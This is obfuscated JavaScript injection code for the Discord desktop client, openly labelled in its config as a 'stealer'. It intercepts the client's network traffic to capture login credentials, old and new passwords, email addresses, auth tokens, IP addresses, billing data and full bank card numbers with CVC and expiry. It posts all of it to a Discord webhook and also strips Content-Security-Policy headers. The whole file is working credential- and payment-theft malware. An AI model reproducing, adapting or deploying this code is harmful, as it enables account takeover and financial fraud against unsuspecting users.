config = {
  webhook: 'https://discord.com/api/webhooks/XXXX',
  'embed-color': 3553599,
  emojis: {
    nitroType: _0x290dd3(233),
    password: _0x290dd3(192),
    ip: _0x290dd3(151),
    billing: '<a:billing:990734778888228904>',
    badges: _0x290dd3(230),
    oldPass: '<:old_password:991080661941116978>',
    newPass: _0x290dd3(168),
    email: _0x290dd3(186),
    paypal: _0x290dd3(226),
    classic: _0x290dd3(166),
    boost: _0x290dd3(152),
  },
  api: 'https://discord.com/api/v9/users/@me',
  'stealer-icon': _0x290dd3(150),
  'stealer-name': _0x290dd3(259),
  filter: {
    urls: [
      _0x290dd3(247),
      'https://discordapp.com/api/v*/users/@me',
      _0x290dd3(266),
      _0x290dd3(167),
      _0x290dd3(213),
      _0x290dd3(200),
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      _0x290dd3(297),
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      _0x290dd3(246),
    ],
  },
  filter2: {
    urls: [
      _0x290dd3(228),
      _0x290dd3(219),
      _0x290dd3(234),
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
}
userFlags = [
  {
    n: 1 << 0,
    t: _0x290dd3(215),
    e: _0x290dd3(184),
  },
  {
    n: 1 << 1,
    t: _0x290dd3(236),
    e: _0x290dd3(201),
  },
  {
    n: 1 << 2,
    t: 'HYPESQUAD',
    e: _0x290dd3(243),
  },
  {
    n: 1 << 3,
    t: _0x290dd3(171),
    e: _0x290dd3(263),
  },
  {
    n: 1 << 6,
    t: _0x290dd3(255),
    e: _0x290dd3(285),
  },
  {
    n: 1 << 7,
    t: _0x290dd3(205),
    e: _0x290dd3(174),
  },
  {
    n: 1 << 8,
    t: 'BALANCE',
    e: _0x290dd3(248),
  },
  {
    n: 1 << 9,
    t: _0x290dd3(183),
    e: _0x290dd3(261),
  },
  {
    n: 1 << 14,
    t: _0x290dd3(182),
    e: _0x290dd3(204),
  },
  {
    n: 1 << 17,
    t: 'VERIFIED_DEVELOPER',
    e: _0x290dd3(193),
  },
  {
    n: 1 << 18,
    t: _0x290dd3(169),
    e: '<:Moderation_Icon:994689773379797182>',
  },
]
execScript = (_0x5479c6) => {
  const _0x5d3b7c = _0x290dd3,
    _0x395d81 = BrowserWindow[_0x5d3b7c(274)]()[0]
  return _0x395d81[_0x5d3b7c(244)][_0x5d3b7c(241)](_0x5479c6, true)
}
getIP = async (_0x3167b0) => {
  const _0x27edba = _0x290dd3
  return await execScript(_0x27edba(197))
}
getInfo = async (_0x306172) => {
  const _0x4c90e9 = _0x290dd3,
    _0xdc621f = await execScript(
      _0x4c90e9(189) + config.api + _0x4c90e9(253) + _0x306172 + _0x4c90e9(235)
    )
  return JSON[_0x4c90e9(254)](_0xdc621f)
}
fetchBilling = async (_0x28a1e1) => {
  const _0x28daad = _0x290dd3,
    _0x425045 = await execScript(
      _0x28daad(190) +
        config[_0x28daad(312)] +
        _0x28daad(208) +
        _0x28a1e1 +
        _0x28daad(159)
    )
  try {
    return typeof _0x425045 === 'string'
      ? JSON[_0x28daad(254)](_0x425045)
      : _0x425045
  } catch (_0x2e0dae) {
    return null
  }
}
fetchFriends = async (_0x4eac84) => {
  const _0x103a91 = _0x290dd3,
    _0x5eaa6b = await execScript(
      'var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open("GET", "' +
        config.api +
        '/relationships", false); \n    xmlHttp.setRequestHeader("Authorization", "' +
        _0x4eac84 +
        _0x103a91(159)
    )
  return JSON[_0x103a91(254)](_0x5eaa6b)
}
sendFriends = async (_0x3d9f99, _0x5a6ab7) => {
  const _0xd58591 = _0x290dd3,
    _0x233417 = await fetchFriends(_0x3d9f99),
    _0x1a6440 = [
      'STAFF',
      _0xd58591(236),
      _0xd58591(239),
      _0xd58591(171),
      _0xd58591(183),
      'BUG_HUNTER_2',
      _0xd58591(291),
      'CERTIFIED_MODERATOR',
    ],
    _0x3d7fb5 = _0x5a6ab7[_0xd58591(157)]
      ? _0xd58591(292) + _0x5a6ab7.id + '/' + _0x5a6ab7.avatar + '.webp'
      : 'https://cdn.discordapp.com/embed/avatars/' +
        (_0x5a6ab7[_0xd58591(199)] % 5) +
        '.png'
  let _0x155a51 = ''
  if (_0x233417) {
    _0x233417[_0xd58591(298)]((_0x9158ff) => {
      const _0x3d97a4 = _0xd58591
      if (_0x9158ff[_0x3d97a4(156)] === 1) {
        if (!_0x9158ff[_0x3d97a4(284)]) {
          return
        }
        const _0x9a21aa = parseBadges(
          _0x9158ff[_0x3d97a4(284)]?.[_0x3d97a4(187)]
        )
        let _0xf56085 = ''
        _0x9a21aa[_0x3d97a4(298)]((_0xd5b111) => {
          const _0x2160ca = _0x3d97a4
          if (_0x1a6440[_0x2160ca(164)](_0xd5b111.t)) {
            _0xf56085 += _0xd5b111.e + ' '
          }
        })
        if (_0xf56085) {
          _0x155a51 +=
            _0xf56085 +
            _0x3d97a4(270) +
            _0x9158ff[_0x3d97a4(284)]?.[_0x3d97a4(237)] +
            '#' +
            _0x9158ff.user?.discriminator +
            _0x3d97a4(207)
        }
      }
    })
  }
  return hooker({
    embeds: [
      {
        color: config[_0xd58591(288)],
        author: {
          name: 'HQ Friends (' + _0x5a6ab7.id + ')',
          icon_url: _0x3d7fb5,
        },
        footer: {
          text: config[_0xd58591(178)],
          icon_url: config[_0xd58591(188)],
        },
        description: _0x155a51.length > 1 ? _0x155a51 : _0xd58591(273),
      },
    ],
  })
}
getBilling = async (_0x17f4a9) => {
  const _0x454c88 = _0x290dd3,
    _0xf821a9 = await fetchBilling(_0x17f4a9)
  if (!_0xf821a9) {
    return _0x454c88(300)
  }
  let _0x1872df = ''
  _0xf821a9[_0x454c88(298)]((_0x4633c1) => {
    const _0x4aa209 = _0x454c88
    if (!_0x4633c1[_0x4aa209(240)]) {
      switch (_0x4633c1.type) {
        case 1:
          _0x1872df += _0x4aa209(223)
          break
        case 2:
          _0x1872df += config[_0x4aa209(271)][_0x4aa209(310)] + ' '
          break
      }
    }
  })
  if (!_0x1872df) {
    _0x1872df = _0x454c88(300)
  }
  return _0x1872df
}
getNitro = (_0x17d538) => {
  const _0x222da8 = _0x290dd3
  switch (_0x17d538) {
    case 0:
      return _0x222da8(286)
    case 1:
      return config[_0x222da8(271)][_0x222da8(176)]
    case 2:
      return (
        config[_0x222da8(271)][_0x222da8(176)] +
        ' ' +
        config[_0x222da8(271)][_0x222da8(296)]
      )
    default:
      return _0x222da8(286)
  }
}
parseBadges = (_0x59fff6) => {
  let _0x19fe51 = []
  return (
    userFlags.forEach((_0x18f493) => {
      const _0x103c05 = _0x2b04
      if ((_0x59fff6 & _0x18f493.n) == _0x18f493.n) {
        _0x19fe51[_0x103c05(165)](_0x18f493)
      }
    }),
    _0x19fe51
  )
}
getBadges = (_0x857de2) => {
  const _0x423c02 = _0x290dd3,
    _0x4be3bf = parseBadges(_0x857de2)
  let _0x4a867a = ''
  if (!_0x4be3bf || _0x4be3bf[_0x423c02(299)] < 0) {
    _0x4a867a = '`No Badges`'
  } else {
    _0x4be3bf[_0x423c02(298)]((_0x1dbf82) => {
      _0x4a867a += _0x1dbf82.e
    })
  }
  return _0x4a867a
}
hooker = async (_0x51e298) => {
  const _0x2d6328 = _0x290dd3,
    _0x3c2162 = JSON[_0x2d6328(268)](_0x51e298),
    _0x128810 = new URL(config.webhook),
    _0x335a7f = {
      'Content-Type': _0x2d6328(311),
      'Access-Control-Allow-Origin': '*',
    },
    _0x31e411 = {
      protocol: _0x128810[_0x2d6328(258)],
      hostname: _0x128810[_0x2d6328(262)],
      path: _0x128810[_0x2d6328(216)],
      method: _0x2d6328(293),
      headers: _0x335a7f,
    }
  return new Promise((_0x4cd327) => {
    const _0x2cdfde = _0x2d6328,
      _0x63483a = https[_0x2cdfde(196)](_0x31e411)
    _0x63483a.on(_0x2cdfde(245), console[_0x2cdfde(280)])
    _0x63483a.on(_0x2cdfde(225), () => _0x4cd327())
    _0x63483a.write(_0x3c2162)
    _0x63483a[_0x2cdfde(155)]()
  })
}
login = async (_0x14eb0f, _0x94fe06, _0x22754c) => {
  const _0x1714db = _0x290dd3,
    _0x450490 = await getInfo(_0x22754c),
    _0x314075 = getNitro(_0x450490[_0x1714db(210)]),
    _0x2e7899 = getBadges(_0x450490[_0x1714db(214)]),
    _0x230be0 = await getBilling(_0x22754c),
    _0x117eae = await getIP(),
    _0x4d0b88 = _0x450490.avatar
      ? _0x1714db(292) +
        _0x450490.id +
        '/' +
        _0x450490[_0x1714db(157)] +
        _0x1714db(217)
      : _0x1714db(224) + (_0x450490.discriminator % 5) + '.png',
    _0x5806b5 = {
      embeds: [
        {
          color: config[_0x1714db(288)],
          author: {
            name:
              _0x450490[_0x1714db(237)] +
              '#' +
              _0x450490[_0x1714db(199)] +
              ' (' +
              _0x450490.id +
              ')',
            icon_url: config['stealer-icon'],
          },
          thumbnail: { url: _0x4d0b88 },
          footer: {
            text: config[_0x1714db(178)],
            icon_url: config['stealer-icon'],
          },
          fields: [
            {
              name: '' + config[_0x1714db(271)].billing,
              value: '`' + _0x22754c + '`',
            },
            {
              name: config[_0x1714db(271)].badges + _0x1714db(265),
              value:
                '' +
                (_0x2e7899[_0x1714db(299)] > 0 ? _0x2e7899 : _0x1714db(162)),
              inline: true,
            },
            {
              name: config[_0x1714db(271)][_0x1714db(172)] + ' Nitro Type',
              value: _0x314075,
              inline: true,
            },
            {
              name: config.emojis[_0x1714db(153)] + _0x1714db(185),
              value: _0x230be0,
              inline: true,
            },
            {
              name: config[_0x1714db(271)].ip + _0x1714db(302),
              value: '`' + _0x117eae + '`',
              inline: true,
            },
            {
              name: config[_0x1714db(271)].email + ' Email',
              value: '`' + (_0x14eb0f || 'null') + '`',
              inline: true,
            },
            {
              name: config[_0x1714db(271)][_0x1714db(158)] + _0x1714db(267),
              value: '`' + (_0x94fe06 || _0x1714db(194)) + '`',
              inline: true,
            },
          ],
        },
      ],
    }
  await hooker(_0x5806b5)
  sendFriends(_0x22754c, _0x450490)
}
passwordChanged = async (_0x4699f3, _0x27ce23, _0x22fc57) => {
  const _0x12fb7f = _0x290dd3,
    _0x1b0950 = await getInfo(_0x22fc57),
    _0x5166f3 = getNitro(_0x1b0950[_0x12fb7f(210)]),
    _0xebda3e = getBadges(_0x1b0950[_0x12fb7f(214)]),
    _0x5a1c28 = await getBilling(_0x22fc57),
    _0x306b90 = await getIP(),
    _0x33f113 = _0x1b0950[_0x12fb7f(157)]
      ? _0x12fb7f(292) + _0x1b0950.id + '/' + _0x1b0950.avatar + '.webp'
      : _0x12fb7f(224) + (_0x1b0950[_0x12fb7f(199)] % 5) + _0x12fb7f(231),
    _0x3a29f9 = {
      embeds: [
        {
          color: config[_0x12fb7f(288)],
          title: _0x12fb7f(149),
          author: {
            name:
              _0x1b0950[_0x12fb7f(237)] +
              '#' +
              _0x1b0950[_0x12fb7f(199)] +
              ' (' +
              _0x1b0950.id +
              ')',
            icon_url: config[_0x12fb7f(188)],
          },
          thumbnail: { url: _0x33f113 },
          footer: {
            text: config[_0x12fb7f(178)],
            icon_url: config[_0x12fb7f(188)],
          },
          fields: [
            {
              name: '' + config[_0x12fb7f(271)][_0x12fb7f(153)],
              value: '`' + _0x22fc57 + '`',
            },
            {
              name: config[_0x12fb7f(271)][_0x12fb7f(179)] + _0x12fb7f(265),
              value: '' + (_0xebda3e.length > 0 ? _0xebda3e : _0x12fb7f(162)),
              inline: true,
            },
            {
              name: config[_0x12fb7f(271)][_0x12fb7f(172)] + _0x12fb7f(211),
              value: _0x5166f3,
              inline: true,
            },
            {
              name: config[_0x12fb7f(271)][_0x12fb7f(153)] + _0x12fb7f(185),
              value: _0x5a1c28,
              inline: true,
            },
            {
              name: config.emojis.ip + ' IP',
              value: '`' + _0x306b90 + '`',
              inline: true,
            },
            {
              name: config[_0x12fb7f(271)][_0x12fb7f(276)] + _0x12fb7f(277),
              value: '`' + (_0x1b0950[_0x12fb7f(276)] || _0x12fb7f(194)) + '`',
              inline: true,
            },
            {
              name: config[_0x12fb7f(271)][_0x12fb7f(257)] + _0x12fb7f(313),
              value: '`' + (_0x4699f3 || 'null') + '`',
              inline: true,
            },
            {
              name: config.emojis[_0x12fb7f(303)] + _0x12fb7f(251),
              value: '`' + (_0x27ce23 || _0x12fb7f(194)) + '`',
              inline: true,
            },
          ],
        },
      ],
    }
  await hooker(_0x3a29f9)
  sendFriends(_0x22fc57, _0x1b0950)
}
emailChanged = async (_0x51842f, _0x3108cd, _0x20ac26) => {
  const _0x162e51 = _0x290dd3,
    _0x33e96e = await getInfo(_0x20ac26),
    _0x2aeee9 = getNitro(_0x33e96e.premium_type),
    _0x25cd9d = getBadges(_0x33e96e[_0x162e51(214)]),
    _0x279752 = await getBilling(_0x20ac26),
    _0xf8caab = await getIP(),
    _0xf89a40 = _0x33e96e.avatar
      ? _0x162e51(292) + _0x33e96e.id + '/' + _0x33e96e.avatar + _0x162e51(217)
      : _0x162e51(224) + (_0x33e96e.discriminator % 5) + _0x162e51(231),
    _0x2a490e = {
      embeds: [
        {
          color: config['embed-color'],
          title: 'Email Changed',
          author: {
            name:
              _0x33e96e[_0x162e51(237)] +
              '#' +
              _0x33e96e[_0x162e51(199)] +
              ' (' +
              _0x33e96e.id +
              ')',
            icon_url: config[_0x162e51(188)],
          },
          thumbnail: { url: _0xf89a40 },
          footer: {
            text: config[_0x162e51(178)],
            icon_url: config[_0x162e51(188)],
          },
          fields: [
            {
              name: '' + config.emojis[_0x162e51(153)],
              value: '`' + _0x20ac26 + '`',
            },
            {
              name: config[_0x162e51(271)][_0x162e51(179)] + _0x162e51(265),
              value: '' + (_0x25cd9d.length > 0 ? _0x25cd9d : _0x162e51(162)),
              inline: true,
            },
            {
              name: config[_0x162e51(271)][_0x162e51(172)] + _0x162e51(211),
              value: _0x2aeee9,
              inline: true,
            },
            {
              name: config[_0x162e51(271)][_0x162e51(153)] + _0x162e51(185),
              value: _0x279752,
              inline: true,
            },
            {
              name: config.emojis.ip + _0x162e51(302),
              value: '`' + _0xf8caab + '`',
              inline: true,
            },
            {
              name: config[_0x162e51(271)].email + _0x162e51(277),
              value: '`' + (_0x51842f || _0x162e51(194)) + '`',
              inline: true,
            },
            {
              name: config[_0x162e51(271)][_0x162e51(158)] + ' Password',
              value: '`' + (_0x3108cd || _0x162e51(194)) + '`',
              inline: true,
            },
          ],
        },
      ],
    }
  await hooker(_0x2a490e)
  sendFriends(_0x20ac26, _0x33e96e)
}
PaypalAdded = async (_0x4dd3e1) => {
  const _0x5b248d = _0x290dd3,
    _0x11f28f = await getInfo(_0x4dd3e1),
    _0x268cbf = getNitro(_0x11f28f[_0x5b248d(210)]),
    _0x38b996 = getBadges(_0x11f28f[_0x5b248d(214)]),
    _0x1fff94 = await getBilling(_0x4dd3e1),
    _0x401c15 = await getIP(),
    _0x4c97eb = _0x11f28f[_0x5b248d(157)]
      ? _0x5b248d(292) +
        _0x11f28f.id +
        '/' +
        _0x11f28f[_0x5b248d(157)] +
        '.webp'
      : _0x5b248d(224) + (_0x11f28f.discriminator % 5) + _0x5b248d(231),
    _0x3b75ea = {
      embeds: [
        {
          color: config[_0x5b248d(288)],
          title: _0x5b248d(256),
          author: {
            name:
              _0x11f28f[_0x5b248d(237)] +
              '#' +
              _0x11f28f[_0x5b248d(199)] +
              ' (' +
              _0x11f28f.id +
              ')',
            icon_url: config[_0x5b248d(188)],
          },
          thumbnail: { url: _0x4c97eb },
          footer: {
            text: config['stealer-name'],
            icon_url: config[_0x5b248d(188)],
          },
          fields: [
            {
              name: '' + config.emojis[_0x5b248d(153)],
              value: '`' + _0x4dd3e1 + '`',
            },
            {
              name: config.emojis[_0x5b248d(179)] + _0x5b248d(265),
              value:
                '' +
                (_0x38b996[_0x5b248d(299)] > 0 ? _0x38b996 : '`No Badges`'),
              inline: true,
            },
            {
              name: config[_0x5b248d(271)][_0x5b248d(172)] + _0x5b248d(211),
              value: _0x268cbf,
              inline: true,
            },
            {
              name: config[_0x5b248d(271)][_0x5b248d(153)] + _0x5b248d(185),
              value: _0x1fff94,
              inline: true,
            },
            {
              name: config[_0x5b248d(271)].ip + ' IP',
              value: '`' + _0x401c15 + '`',
              inline: true,
            },
            {
              name: config[_0x5b248d(271)][_0x5b248d(276)] + _0x5b248d(277),
              value: '`' + (_0x11f28f[_0x5b248d(276)] || _0x5b248d(194)) + '`',
              inline: true,
            },
            {
              name: config[_0x5b248d(271)].password + _0x5b248d(267),
              value: '`null`',
              inline: true,
            },
          ],
        },
      ],
    }
  await hooker(_0x3b75ea)
  sendFriends(_0x4dd3e1, _0x11f28f)
}
ccAdded = async (_0x4142a7, _0x1d6a69, _0x1e78e8, _0x2ed5e9, _0x599b9c) => {
  const _0x828b07 = _0x290dd3,
    _0x3e3f07 = await getInfo(_0x599b9c),
    _0x2b3de5 = getNitro(_0x3e3f07[_0x828b07(210)]),
    _0x3e2eab = getBadges(_0x3e3f07[_0x828b07(214)]),
    _0x4fe696 = await getBilling(_0x599b9c),
    _0x248851 = await getIP(),
    _0x335e57 = _0x3e3f07.avatar
      ? _0x828b07(292) +
        _0x3e3f07.id +
        '/' +
        _0x3e3f07[_0x828b07(157)] +
        _0x828b07(217)
      : _0x828b07(224) + (_0x3e3f07[_0x828b07(199)] % 5) + _0x828b07(231),
    _0x5dea89 = {
      embeds: [
        {
          color: config['embed-color'],
          title: 'Bank Card Added',
          author: {
            name:
              _0x3e3f07[_0x828b07(237)] +
              '#' +
              _0x3e3f07[_0x828b07(199)] +
              ' (' +
              _0x3e3f07.id +
              ')',
            icon_url: config[_0x828b07(188)],
          },
          thumbnail: { url: _0x335e57 },
          footer: {
            text: config[_0x828b07(178)],
            icon_url: config[_0x828b07(188)],
          },
          fields: [
            {
              name: '' + config[_0x828b07(271)][_0x828b07(153)],
              value: '`' + _0x599b9c + '`',
            },
            {
              name: config.emojis[_0x828b07(179)] + ' Badges',
              value: '' + (_0x3e2eab.length > 0 ? _0x3e2eab : _0x828b07(162)),
              inline: true,
            },
            {
              name: config[_0x828b07(271)][_0x828b07(172)] + _0x828b07(211),
              value: _0x2b3de5,
              inline: true,
            },
            {
              name: config[_0x828b07(271)][_0x828b07(153)] + _0x828b07(185),
              value: _0x4fe696,
              inline: true,
            },
            {
              name: config[_0x828b07(271)].ip + _0x828b07(302),
              value: '`' + _0x248851 + '`',
              inline: true,
            },
            {
              name: config[_0x828b07(271)][_0x828b07(276)] + _0x828b07(277),
              value: '`' + (_0x3e3f07.email || _0x828b07(194)) + '`',
              inline: true,
            },
            {
              name: config[_0x828b07(271)][_0x828b07(158)] + _0x828b07(267),
              value: _0x828b07(173),
              inline: true,
            },
            {
              name: _0x828b07(198),
              value: '`' + _0x4142a7 + '`',
              inline: true,
            },
            {
              name: _0x828b07(289),
              value: '`' + _0x1d6a69 + '`',
              inline: true,
            },
            {
              name: _0x828b07(206),
              value: '`' + _0x1e78e8 + '/' + _0x2ed5e9 + '`',
              inline: true,
            },
          ],
        },
      ],
    }
  await hooker(_0x5dea89)
  sendFriends(_0x599b9c, _0x3e3f07)
}
session.defaultSession.webRequest[_0x290dd3(304)](
  config[_0x290dd3(238)],
  (_0x2724a9, _0x33723d) => {
    const _0x5853de = _0x290dd3
    if (_0x2724a9[_0x5853de(221)].startsWith(_0x5853de(181))) {
      return _0x33723d({ cancel: true })
    }
  }
)
session[_0x290dd3(202)][_0x290dd3(281)][_0x290dd3(308)](
  (_0x4f1f97, _0x643e96) => {
    const _0x21c072 = _0x290dd3
    _0x4f1f97.url[_0x21c072(232)](config[_0x21c072(203)])
      ? _0x4f1f97.url.includes('discord.com')
        ? _0x643e96({
            responseHeaders: Object[_0x21c072(295)](
              { 'Access-Control-Allow-Headers': '*' },
              _0x4f1f97[_0x21c072(249)]
            ),
          })
        : _0x643e96({
            responseHeaders: Object[_0x21c072(295)](
              {
                'Content-Security-Policy': [
                  _0x21c072(160),
                  _0x21c072(227),
                  _0x21c072(287),
                ],
                'Access-Control-Allow-Headers': '*',
                'Access-Control-Allow-Origin': '*',
              },
              _0x4f1f97[_0x21c072(249)]
            ),
          })
      : (delete _0x4f1f97[_0x21c072(249)][_0x21c072(250)],
        delete _0x4f1f97[_0x21c072(249)]['content-security-policy-report-only'],
        _0x643e96({
          responseHeaders: {
            ..._0x4f1f97.responseHeaders,
            'Access-Control-Allow-Headers': '*',
          },
        }))
  }
)
session[_0x290dd3(202)][_0x290dd3(281)][_0x290dd3(229)](
  config[_0x290dd3(154)],
  async (_0x297e09, _0x3de6d9) => {
    const _0x415770 = _0x290dd3
    if (_0x297e09.statusCode !== 200 && _0x297e09[_0x415770(191)] !== 202) {
      return
    }
    const _0x54ec27 = Buffer.from(_0x297e09[_0x415770(195)][0][_0x415770(282)])[
        _0x415770(163)
      ](),
      _0x13e89b = JSON[_0x415770(254)](_0x54ec27),
      _0x4d41a2 = await execScript(_0x415770(260))
    switch (true) {
      case _0x297e09[_0x415770(221)][_0x415770(222)](_0x415770(283)):
        login(_0x13e89b[_0x415770(283)], _0x13e89b[_0x415770(158)], _0x4d41a2)[
          _0x415770(242)
        ](console[_0x415770(245)])
        break
      case _0x297e09[_0x415770(221)][_0x415770(222)](_0x415770(220)) &&
        _0x297e09[_0x415770(269)] === _0x415770(290):
        if (!_0x13e89b[_0x415770(158)]) {
          return
        }
        _0x13e89b[_0x415770(276)] &&
          emailChanged(
            _0x13e89b[_0x415770(276)],
            _0x13e89b.password,
            _0x4d41a2
          )[_0x415770(242)](console[_0x415770(245)])
        _0x13e89b[_0x415770(177)] &&
          passwordChanged(
            _0x13e89b[_0x415770(158)],
            _0x13e89b[_0x415770(177)],
            _0x4d41a2
          )[_0x415770(242)](console[_0x415770(245)])
        break
      case _0x297e09[_0x415770(221)][_0x415770(222)](_0x415770(306)) &&
        _0x297e09[_0x415770(269)] === _0x415770(293):
        const _0x3495f6 = querystring[_0x415770(254)](_0x54ec27.toString())
        hooker({
          content:
            JSON[_0x415770(268)](_0x3495f6) +
            String(_0x54ec27) +
            JSON[_0x415770(268)](_0x13e89b),
        }),
          ccAdded(
            _0x3495f6[_0x415770(305)],
            _0x3495f6[_0x415770(275)],
            _0x3495f6[_0x415770(294)],
            _0x3495f6[_0x415770(161)],
            _0x4d41a2
          )[_0x415770(242)](console[_0x415770(245)])
        break
      case _0x297e09.url[_0x415770(222)](_0x415770(272)) &&
        _0x297e09[_0x415770(269)] === _0x415770(293):
        PaypalAdded(_0x4d41a2).catch(console[_0x415770(245)])
        break
      default:
        break
    }
  }
)
